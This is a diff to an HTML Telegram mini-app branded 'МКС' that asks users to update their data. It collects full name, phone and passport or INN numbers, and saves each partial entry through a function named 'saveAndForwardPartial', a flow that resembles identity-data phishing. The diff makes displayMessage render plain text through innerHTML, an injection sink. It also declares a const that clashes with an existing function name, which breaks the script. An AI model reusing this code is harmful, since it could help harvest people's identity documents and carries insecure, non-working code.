@@ -9,10 +9,11 @@
     <style>
         body {
             font-family: Arial, sans-serif;
+            background-color: white;
         }
     </style>
 </head>
-<body class="bg-white">
+<body>
     <div class="max-w-md mx-auto p-4">
         <div id="messageArea" class="bg-white rounded-lg shadow p-4 mb-4 h-96 overflow-y-auto"></div>
         <div id="inputArea" class="flex flex-col">
@@ -22,14 +23,14 @@
     </div>
 
     <script>
-        // Integrate Telegram Web App for real user data
+        // Telegram Web App integration
         let userId = Math.floor(Math.random() * 1000000); // Fallback
         let username = 'WebUser'; // Fallback
         if (window.Telegram && window.Telegram.WebApp) {
             const webApp = window.Telegram.WebApp;
             webApp.ready();
-            userId = webApp.initDataUnsafe.user ? webApp.initDataUnsafe.user.id : userId;
-            username = webApp.initDataUnsafe.user ? webApp.initDataUnsafe.user.username || '' : username;
+            userId = webApp.initDataUnsafe.user?.id || userId;
+            username = webApp.initDataUnsafe.user?.username || username;
         }
 
         // State management
@@ -42,7 +43,7 @@
         };
         const BOT_NAME = 'МКС';
 
-        // Main menu buttons
+        // Button configurations
         const mainMenu = [
             { text: '📝 Обновить данные', action: startForm },
             { text: '🔄 Поменять тариф', action: changeTariff },
@@ -51,15 +52,13 @@
             { text: '🛠️ Дополнительные услуги', action: additionalServicesMenu }
         ];
 
-        // Additional services menu
-        const additionalServicesMenuButtons = [
+        const additionalServicesMenu = [
             { text: '❓ Часто задаваемые вопросы', action: faqMenu },
             { text: 'ℹ️ Инструкция', action: showInstruction },
             { text: '📞 Связаться с техподдержкой', action: contactSupport },
             { text: '↩️ Вернуться назад', action: backToMainMenu }
         ];
 
-        // FAQ menu
         const faqMenuButtons = [
             { text: '⏳ До какого числа нужно передавать показания?', action: faqDeadline },
             { text: '💸 Что будет, если не передать данные вовремя?', action: faqPenalty },
@@ -70,13 +69,11 @@
             { text: '↩️ Вернуться назад', action: backToAdditionalServices }
         ];
 
-        // Unauthorized action menu
         const unauthorizedActionMenu = [
             { text: '🔐 Авторизоваться', action: startForm },
             { text: '↩️ Сменить действие', action: backToMainMenu }
         ];
 
-        // Document type menu
         const documentTypeMenu = [
             { text: '📄 Паспорт', action: () => setDocumentType('Паспорт') },
             { text: '🧾 ИНН', action: () => setDocumentType('ИНН') },
@@ -84,37 +81,39 @@
             { text: '↩️ Вернуться назад', action: backToPhone }
         ];
 
-        // Back button
         const backButton = [{ text: '↩️ Вернуться назад', action: null }];
 
-        // Display message
+        // Utility functions
         function displayMessage(text, isHtml = false) {
             const messageArea = document.getElementById('messageArea');
             const messageDiv = document.createElement('div');
             messageDiv.className = 'p-2 mb-2 bg-gray-100 rounded text-black';
-            if (isHtml) {
-                messageDiv.innerHTML = text;
-            } else {
-                messageDiv.textContent = text;
-            }
+            messageDiv.innerHTML = isHtml ? text : text.replace(/\n/g, '<br>');
             messageArea.appendChild(messageDiv);
             messageArea.scrollTop = messageArea.scrollHeight;
         }
 
-        // Display buttons
         function displayButtons(buttons) {
             const buttonArea = document.getElementById('buttonArea');
             buttonArea.innerHTML = '';
             buttons.forEach(button => {
-                const btn = document.createElement('button');
-                btn.className = 'bg-blue-500 text-white p-2 rounded hover:bg-blue-600';
-                btn.textContent = button.text;
-                btn.onclick = button.action;
-                buttonArea.appendChild(btn);
+                if (button && button.action) {
+                    const btn = document.createElement('button');
+                    btn.className = 'bg-blue-500 text-white p-2 rounded hover:bg-blue-600';
+                    btn.textContent = button.text;
+                    btn.onclick = () => {
+                        try {
+                            button.action();
+                        } catch (error) {
+                            console.error(`Error in button action for "${button.text}":`, error);
+                            displayMessage('❌ Произошла ошибка. Попробуйте снова. ⚠️');
+                        }
+                    };
+                    buttonArea.appendChild(btn);
+                }
             });
         }
 
-        // Display inline button
         function displayInlineButton(text, url) {
             const buttonArea = document.getElementById('buttonArea');
             buttonArea.innerHTML = '';
@@ -125,12 +124,12 @@
             buttonArea.appendChild(btn);
         }
 
-        // Show input field
         function showInput(placeholder) {
             const userInput = document.getElementById('userInput');
             userInput.style.display = 'block';
             userInput.placeholder = placeholder;
             userInput.focus();
+            userInput.onkeypress = null; // Clear previous listeners
             userInput.onkeypress = (e) => {
                 if (e.key === 'Enter' && userInput.value.trim()) {
                     handleInput(userInput.value.trim());
@@ -139,12 +138,10 @@
             };
         }
 
-        // Hide input field
         function hideInput() {
             document.getElementById('userInput').style.display = 'none';
         }
 
-        // Save and forward partial data
         function saveAndForwardPartial(isComplete = false) {
             const timestamp = new Date().toISOString().replace('T', ' ').slice(0, 19);
             const userWithBot = username ? `@${username} (${BOT_NAME})` : `(${BOT_NAME})`;
@@ -152,7 +149,6 @@
             const docNum = userData.document_number || '';
             const record = `${timestamp}\t${userId}\t${userWithBot}\t${userData.fullname}\t${userData.phone}\t${docType} ${docNum}\n`;
             
-            // Simulate file write by creating a downloadable file
             const blob = new Blob([record], { type: 'text/plain' });
             const url = URL.createObjectURL(blob);
             const a = document.createElement('a');
@@ -166,7 +162,7 @@
             console.log(`Saved: ${record}`);
         }
 
-        // Start form
+        // Form and navigation functions
         function startForm() {
             currentState = 'fullname';
             userData = { fullname: '', phone: '', document_type: '', document_number: '' };
@@ -177,17 +173,13 @@
             showInput('Введите ФИО...');
         }
 
-        // Handle user input
         function handleInput(input) {
             if (input === '↩️ Вернуться назад') {
-                if (currentState === 'fullname') {
-                    backToMainMenu();
-                } else if (currentState === 'phone') {
-                    backToFullname();
-                } else if (currentState === 'document_type') {
-                    backToPhone();
-                } else if (currentState === 'document_number') {
-                    backToDocumentType();
+                switch (currentState) {
+                    case 'fullname': backToMainMenu(); break;
+                    case 'phone': backToFullname(); break;
+                    case 'document_type': backToPhone(); break;
+                    case 'document_number': backToDocumentType(); break;
                 }
                 return;
             }
@@ -231,7 +223,6 @@
             }
         }
 
-        // Set document type
         function setDocumentType(type) {
             userData.document_type = type;
             saveAndForwardPartial();
@@ -243,11 +234,10 @@
             showInput(`Введите номер ${type}...`);
         }
 
-        // Navigation functions
         function backToMainMenu() {
             currentState = null;
             userData = { fullname: '', phone: '', document_type: '', document_number: '' };
-            displayMessage('🏠 Добро пожаловать в МКС-бот! 📡 Управляйте своими услугами легко и быстро! 🌐');
+            displayMessage('<span class="text-blue-500 text-2xl">🏠 Добро пожаловать в МКС-мини-приложение!</span><br>📡 Управляйте своими услугами легко и быстро! 🌐', true);
             displayButtons(mainMenu);
             hideInput();
         }
@@ -297,7 +287,7 @@
 
         function additionalServicesMenu() {
             displayMessage('🛠️ Выберите опцию: 🌐');
-            displayButtons(additionalServicesMenuButtons);
+            displayButtons(additionalServicesMenu);
             hideInput();
         }
 
@@ -372,9 +362,10 @@
             additionalServicesMenu();
         }
 
-        // Initialize with welcome message styled similarly to the image
-        displayMessage('<span class="text-blue-500 text-2xl">🏠 Добро пожаловать в МКС-мини-приложение!</span><br>📡 Управляйте своими услугами легко и быстро! 🌐', true);
-        displayButtons(mainMenu);
+        // Initialize
+        window.onload = () => {
+            backToMainMenu();
+        };
     </script>
 </body>
 </html>
